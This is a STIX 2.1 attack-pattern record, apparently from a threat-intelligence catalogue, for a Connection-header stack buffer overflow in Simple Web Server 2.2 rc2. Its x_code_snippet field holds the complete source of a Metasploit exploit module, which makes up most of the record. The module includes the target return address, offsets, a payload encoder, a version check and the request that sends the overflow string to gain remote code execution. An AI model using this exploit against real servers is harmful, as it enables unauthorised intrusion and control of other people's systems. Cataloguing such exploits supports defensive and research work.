{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--67b4d696-e726-4814-8728-5e52d182067c",
    "created": "2024-08-14T16:54:53.107008Z",
    "modified": "2024-08-14T16:54:53.107011Z",
    "name": "\"Simple Web Server Connection Header Buffer Overflow\"",
    "description": " This module exploits a vulnerability in Simple Web Server 2.2 rc2. A remote user can send a long string data in the Connection Header to causes an overflow on the stack when function vsprintf() is used, and gain arbitrary code execution. The module has been tested successfully on Windows 7 SP1 and Windows XP SP3.  'License'\t  => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/sws_connection_bof.rb",
            "external_id": "sws_connection_bof.rb"
        },
        {
            "source_name": "reference",
            "url": "http://ghostinthelab.wordpress.com/2012/07/19/simplewebserver-2-2-rc2-remote-buffer-overflow-exploit/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  HttpFingerprint = { :pattern => [ /PMSoftware-SWS/ ] }\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'        => \"Simple Web Server Connection Header Buffer Overflow\",\n      'Description' => %q{\n        This module exploits a vulnerability in Simple Web Server 2.2 rc2. A remote user\n        can send a long string data in the Connection Header to causes an overflow on the\n        stack when function vsprintf() is used, and gain arbitrary code execution. The\n        module has been tested successfully on Windows 7 SP1 and Windows XP SP3.\n      },\n      'License'\t  => MSF_LICENSE,\n      'Author'      =>\n        [\n          'mr.pr0n', # Vulnerability Discovery and PoC\n          'juan vazquez' # Metasploit module\n        ],\n      'References' =>\n        [\n          ['OSVDB', '84310'],\n          ['EDB', '19937'],\n          ['URL', 'http://ghostinthelab.wordpress.com/2012/07/19/simplewebserver-2-2-rc2-remote-buffer-overflow-exploit/']\n        ],\n      'Payload'\t =>\n        {\n          'BadChars' => \"\\x00\\x0a\\x0d\",\n          'Space' => 2048,\n          'DisableNops' => true,\n          'PrependEncoder' => \"\\x81\\xC4\\x60\\xF0\\xFF\\xFF\", # add esp, -4000\n        },\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => \"process\",\n        },\n      'Platform' => 'win',\n      'Targets'  =>\n        [\n          [\n            'SimpleWebServer 2.2-rc2 / Windows XP SP3 / Windows 7 SP1',\n            {\n              'Ret' => 0x6fcbc64b, # call edi from libstdc++-6.dll\n              'Offset' => 2048,\n              'OffsetEDI' => 84\n            }\n          ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2012-07-20',\n      'DefaultTarget'  => 0))\n  end\n\n  def check\n    res = send_request_raw({'uri'=>'/'})\n    if res and res.headers['Server'] =~ /PMSoftware\\-SWS\\/2\\.[0-2]/\n      return Exploit::CheckCode::Appears\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n\n    sploit = payload.encoded\n    sploit << rand_text(target['Offset'] - sploit.length)\n    sploit << [target.ret].pack(\"V\") # eip\n    sploit << rand_text(target['OffsetEDI'])\n    sploit << Metasm::Shellcode.assemble(Metasm::Ia32.new, \"jmp $-#{sploit.length}\").encode_string\n\n    print_status(\"Trying target #{target.name}...\")\n\n    connect\n\n    send_request_cgi({\n      'uri'        => '/',\n      'version'    => '1.1',\n      'method'     => 'GET',\n      'connection' => sploit\n    })\n\n    disconnect\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-07-20",
    "x_mitre_platforms": [
        "win'"
    ]
}